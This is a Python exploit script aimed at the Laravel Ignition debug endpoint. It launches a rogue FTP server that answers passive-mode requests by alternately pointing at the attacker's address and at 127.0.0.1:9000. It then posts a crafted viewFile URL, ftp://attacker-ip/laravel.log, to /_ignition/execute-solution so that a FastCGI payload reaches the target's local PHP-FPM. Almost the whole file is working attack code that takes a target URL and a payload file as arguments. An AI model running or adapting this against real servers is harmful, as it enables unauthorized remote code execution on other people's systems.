# coding: utf-8
import os,socket,threading,time
import argparse
import requests
 
allow_delete = False
#local_ip = "127.0.0.1" #SERVER LOCAL IP
local_port = 21 #DESIRED PORT
#payload_file = './payload'
currdir=os.path.abspath('.')
read = True
  
class FTPserverThread(threading.Thread):
    def __init__(self,accept):
        conn,addr = accept
        self.conn=conn
        self.addr=addr
        self.basewd=currdir
        self.cwd=self.basewd
        self.rest=False
        self.pasv_mode=False
        threading.Thread.__init__(self)
  
    def run(self):
        self.conn.send('220 Welcome!\n'.encode())
        while True:
            cmd=self.conn.recv(256).decode()
            if not cmd: break
            else:
                print('Recieved:',cmd.strip())
                try:
                    func=getattr(self,cmd[:4].strip().upper())
                    func(cmd)
                except Exception as e:
                    print('ERROR:',e)
                    self.conn.send('500 Sorry.\n'.encode())
  
    def SYST(self,cmd):
        self.conn.send('215 UNIX Type: L8\n'.encode())
    def OPTS(self,cmd):
        if cmd[5:-2].upper()=='UTF8 ON':
            self.conn.send('200 OK.\n'.encode())
        else:
            self.conn.send('451 Sorry.\n'.encode())
    def USER(self,cmd):
        self.conn.send('331 OK.\n'.encode())
    def PASS(self,cmd):
        self.conn.send('230 OK.\n'.encode())
    def QUIT(self,cmd):
        self.conn.send('221 Goodbye.\n'.encode())
    def NOOP(self,cmd):
        self.conn.send('200 OK.\n'.encode())
    def TYPE(self,cmd):
        self.mode=cmd[5]
        self.conn.send('200 Binary mode.\n'.encode())
  
    def CDUP(self,cmd):
        if not os.path.samefile(self.cwd,self.basewd):
            #learn from stackoverflow
            self.cwd=os.path.abspath(os.path.join(self.cwd,'..'))
        self.conn.send('200 OK.\n'.encode())
    def PWD(self,cmd):
        cwd=os.path.relpath(self.cwd,self.basewd)
        if cwd=='.':
            cwd='/'
        else:
            cwd='/'+cwd
        self.conn.send(('257 \"%s\"\n' % cwd).encode())
    def CWD(self,cmd):
        chwd=cmd[4:-2]
        if chwd=='/':
            self.cwd=self.basewd
        elif chwd[0]=='/':
            self.cwd=os.path.join(self.basewd,chwd[1:])
        else:
            self.cwd=os.path.join(self.cwd,chwd)
        self.conn.send('250 OK.\n'.encode())
  
    def PORT(self,cmd):
        if self.pasv_mode:
            self.servsock.close()
            self.pasv_mode = False
        l=cmd[5:].split(',')
        self.dataAddr='.'.join(l[:4])
        self.dataPort=(int(l[4])<<8)+int(l[5])
        self.conn.send('200 Get port.\n'.encode())
  
    def PASV(self,cmd): 
        self.pasv_mode = True
        self.servsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.servsock.bind((local_ip,0))
        self.servsock.listen(1)
        global read
        if read:
            ip, port = self.servsock.getsockname()
            read = False
        else:
            ip, port = ('127.0.0.1', 9000)
            read = True
        self.conn.send(('227 Entering Passive Mode (%s,%u,%u).\n' %
                (','.join(ip.split('.')), port>>8&0xFF, port&0xFF)).encode())
  
    def start_datasock(self):
        if self.pasv_mode:
            self.datasock, addr = self.servsock.accept()
            print('connect:', addr)
        else:
            self.datasock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.datasock.connect((self.dataAddr,self.dataPort))
  
    def stop_datasock(self):
        self.datasock.close()
        if self.pasv_mode:
            self.servsock.close()
  
  
    def LIST(self,cmd):
        self.conn.send('150 Here comes the directory listing.\n'.encode())
        print('list:', self.cwd)
        self.start_datasock()
        dirlist = "drwxrwxrwx    1 100      0           11111 Jun 11 21:10" 
        dirlist += "-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22"
        self.datasock.send(("total 2\n"+dirlist).encode())
        self.stop_datasock()
        self.conn.send('226 Directory send OK.\n'.encode())
  
    def toListItem(self,fn):
        st=os.stat(fn)
        fullmode='rwxrwxrwx'
        mode=''
        for i in range(9):
            mode+=((st.st_mode>>(8-i))&1) and fullmode[i] or '-'
        d=(os.path.isdir(fn)) and 'd' or '-'
        ftime=time.strftime(' %b %d %H:%M ', time.gmtime(st.st_mtime))
        return (d+mode+' 1 user group '+str(st.st_size)+ftime+os.path.basename(fn)).encode()
  
    def MKD(self,cmd):
        dn=os.path.join(self.cwd,cmd[4:-2])
        os.mkdir(dn)
        self.conn.send('257 Directory created.\n'.encode())
  
    def RMD(self,cmd):
        dn=os.path.join(self.cwd,cmd[4:-2])
        if allow_delete:
            os.rmdir(dn)
            self.conn.send('250 Directory deleted.\n'.encode())
        else:
            self.conn.send('450 Not allowed.\n'.encode())
  
    def DELE(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        if allow_delete:
            os.remove(fn)
            self.conn.send('250 File deleted.\n'.encode())
        else:
            self.conn.send('450 Not allowed.\n'.encode())
  
    def RNFR(self,cmd):
        self.rnfn=os.path.join(self.cwd,cmd[5:-2])
        self.conn.send('350 Ready.\n'.encode())
  
    def RNTO(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        os.rename(self.rnfn,fn)
        self.conn.send('250 File renamed.\n'.encode())
  
    def REST(self,cmd):
        self.pos=int(cmd[5:-2])
        self.rest=True
        self.conn.send('250 File position reseted.\n'.encode())
  
    def RETR(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        print('Downlowding:',fn)
        if self.mode=='I':
            fi=open(payload_file,'rb')
        else:
            fi=open(payload_file,'r')
        self.conn.send('150 Opening data connection.\n'.encode())
        if self.rest:
            fi.seek(self.pos)
            self.rest=False
        data= fi.read(1024)
        self.start_datasock()
        while data:
            self.datasock.send(data)
            data=fi.read(1024)
        fi.close()
        self.stop_datasock()
        self.conn.send('226 Transfer complete.\n'.encode())
  
    def STOR(self,cmd):
        fn=os.path.join(self.cwd,cmd[5:-2])
        print('Uplaoding:',fn)
        self.conn.send('150 Opening data connection.\n'.encode())
        self.start_datasock()
        while True:
            data=self.datasock.recv(1024).decode()
            if not data: break
        fo.close()
        self.stop_datasock()
        self.conn.send('226 Transfer complete.\n'.encode())

    def SIZE(self, cmd):
        fn=cmd[5:-2]
        if not read:
            self.conn.send(("550 %s is not retrievable.\n" % fn).encode())
        else:
            size = 3
            self.conn.send(("213 %s\n" % size).encode())

    def EPSV(self, cmd):
        self.conn.send('220 Other commands other than EPSV are now disabled.\n'.encode())
  
class FTPserver(threading.Thread):
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((local_ip,local_port))
        threading.Thread.__init__(self)
  
    def run(self):
        self.sock.listen(5)
        while True:
            th=FTPserverThread(self.sock.accept())
            th.daemon=True
            th.start()
  
    def stop(self):
        self.sock.close()

def attack(url, ip):
    data = {
            "solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "username",
                "viewFile":"ftp://%s/laravel.log" % ip
            }
    }
    try:
        requests.post('%s/_ignition/execute-solution' % url, json=data);
    except Exception as e:
        pass

if __name__=='__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="target url. eg: https://google.com/", required=True)
    parser.add_argument('-i', '--ip', help="your external ip. eg: 1.1.1.1. default: 127.0.0.1", default="127.0.0.1")
    parser.add_argument('-f', '--file', help="your fastcgi payload . default: ./payload", default="./payload")

    args = parser.parse_args()
    local_ip = args.ip
    payload_file = args.file

    ftp=FTPserver()
    ftp.daemon=True
    print('[-] Luanching FTP Server.')
    ftp.start()

    print('[-] Sending payload to Ignition. Wait for ftp connection.')
    attack(args.target, local_ip)

    input('Enter to end...\n')
    ftp.stop()
